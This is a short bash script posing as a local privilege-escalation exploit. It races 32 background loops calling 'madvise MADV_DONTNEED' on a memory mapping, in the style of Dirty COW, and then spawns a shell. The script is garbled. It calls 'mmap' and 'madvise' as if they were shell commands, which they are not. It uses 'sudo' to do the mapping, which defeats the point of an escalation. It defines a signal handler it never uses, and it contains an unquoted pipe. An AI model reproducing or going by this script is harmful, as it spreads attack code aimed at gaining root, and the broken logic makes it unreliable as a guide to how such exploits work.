#!/bin/bash

SHELL="/bin/sh"
TFILE="/tmp/.X11-unix/X"
FNAME="/tmp/baby"

sigsegv_handler() {
    g_done=1
}

spawn_shell() {
    $SHELL
}

race() {
    while [ ! $g_done ]
    do
        if [ ! -f $TFILE ]
        then
            continue
        fi
        fd=$(mktemp)
        if [ ! -f $fd ]
        then
            continue
        fi
        echo "xyzzy" > $fd
        rm $fd
        addr=$1
        size=4096
        madvise $addr $size MADV_DONTNEED
    done
}

do_race() {
    addr=$1
    for i in {1..32}
    do
        race $addr &
        pid=$!
        pids+=($pid)
    done
    sleep 2
    spawn_shell
    g_done=1
    for pid in ${pids[*]}
    do
        wait $pid
    done
}

fd=$(mktemp)
map=$(sudo mmap $fd 4096 PROT_READ MAP_PRIVATE 0)
if [ $map == "MAP_FAILED" ]
then
    echo "cannot mmap $TFILE"
    exit 1
fi
sudo mmap $map 4096 "(PROT_READ|PROT_WRITE)" MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED -1 0
do_race $map
